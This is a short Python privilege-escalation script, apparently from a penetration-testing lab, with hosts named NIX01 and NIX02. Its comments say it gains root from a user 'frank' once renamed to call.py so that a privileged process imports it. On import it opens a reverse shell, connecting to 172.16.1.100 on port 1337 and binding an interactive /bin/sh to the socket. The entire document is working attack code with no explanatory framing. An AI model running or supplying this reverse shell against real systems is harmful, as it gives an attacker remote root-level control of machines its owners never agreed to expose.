import os
import socket
import subprocess
"""
Script to used to gain root from frank in NIX02
Change name to call.py
LISTEN ON NIX01 on port 1337
OR USE CHISEL TO TUNNEL IT TO YOUR MACHINE(TOO MUCH A HEADACHE)
"""
if __name__=='__main__':
    print('caca')
else:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("172.16.1.100",1337))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    p=subprocess.call(["/bin/sh","-i"])